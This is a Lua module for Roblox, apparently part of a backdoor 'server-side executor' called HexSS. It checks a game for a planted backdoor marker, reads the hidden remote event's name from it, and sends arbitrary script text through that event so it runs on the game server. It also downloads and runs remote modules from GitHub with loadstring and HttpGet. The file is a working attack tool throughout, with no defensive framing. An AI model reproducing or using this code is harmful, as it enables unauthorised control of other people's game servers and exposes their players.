local BackDoor = {}

IsInfected = false

local BackDoorCount = 0

local Branch = "Stable"-- Latest,Stable

local function import(file)
	return loadstring(game:HttpGet(string.format("https://raw.githubusercontent.com/HexerMaster1929/HexSS/%s/modules/%s.lua",Branch,file)))()
end

local EditorFunctions = import("HexSSEditorFunctions")

function BackDoor.IsGameInfected()
	if game.ReplicatedFirst:FindFirstChild("HexSS_CON") then
		print("Found Backdoor")
		BackDoorCount = BackDoorCount + 1
		IsInfected = true
		return true
	end
end

function BackDoor.GetSSEventName()
	if IsInfected then
		return game.ReplicatedFirst:FindFirstChild("HexSS_CON").Value 
	end	
end

function BackDoor.Execute(Script)
	print(BackDoor.GetSSEventName())
	
	local NewString = EditorFunctions.ParseStringWithFunctions(Script)
	local Event = BackDoor.GetSSEventName()
	game.ReplicatedStorage:FindFirstChild(Event):FireServer(NewString)
end

function BackDoor.GetBackdoorCount()
	return BackDoorCount
end

IsInfected = BackDoor.IsGameInfected()

return BackDoor
